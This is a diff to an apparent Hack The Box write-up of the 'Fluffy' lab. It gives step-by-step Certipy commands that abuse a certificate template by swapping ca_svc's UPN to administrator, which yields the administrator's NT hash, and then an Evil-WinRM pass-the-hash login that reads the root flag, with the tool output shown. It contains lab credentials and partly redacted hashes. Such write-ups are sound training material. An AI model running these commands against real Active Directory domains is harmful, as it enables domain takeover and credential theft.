@@ -681,7 +681,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
     whenChanged                         : 2025-07-01T00:55:32+00:00
 ```
 
-We can see the UPN as ca_svc, now we can change it to Administrator.
+**Step 2: We can see the UPN as ca_svc, now we can change it to Administrator.**
 ```bash
 certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'administrator' -user 'ca_svc' update
 ```
@@ -691,11 +691,11 @@ Output:
     userPrincipalName                   : administrator
 [*] Successfully updated 'ca_svc'
 ```
-Now from the [[#SCA]] where we got the Hash for ca_svc export it like this in your env var:
+**Step 3: Now from the [[#SCA]] where we got the Hash for ca_svc export it like this in your env var.**
 ```bash
 export KRB5CCNAME=ca_svc.ccache
 ```
-Then request the certificate:
+**Step 4: Then request the certificate.**
 ```bash
 certipy req -k -dc-ip '10.10.11.69' -dc-host DC01.fluffy.htb -target 'DC01.fluffy.htb' -ca 'fluffy-DC01-CA' -template 'User'
 ```
@@ -713,7 +713,55 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] Wrote certificate and private key to 'administrator.pfx'
 
 ```
-Now revert back the UPN of ca_svc
+**Step 5: Now revert back the UPN of ca_svc.**
 ```bash
-certipy-ad account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+certipy account -u 'p.agila@fluffy.htb' -p 'prometheusx-303' -dc-ip 10.10.11.69 -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
+```
+Output:
+```bash
+Certipy v5.0.2 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+
+```
+**Step 6: Authenticate as the target administrator.**
+```bash
+certipy auth -dc-ip '10.10.11.69' -pfx 'administrator.pfx'  -username 'administrator' -domain 'fluffy.htb'
+```
+Output:
+```hash
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:{REDACTED}
+```
+
+
+### Flag 2
+Now use the NTLM HASH to login using Evil-Winrm
+```bash
+evil-winrm -i fluffy.htb -u administrator -H '8da83{REDACTED}f676c92a6e'
+```
+And get the flag using
+```bash
+type ..\Desktop\root.txt
+```
+Output
+```Powershell
+Evil-WinRM shell v3.7
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
+8a3033{Redacted}f4046bd8
 ```
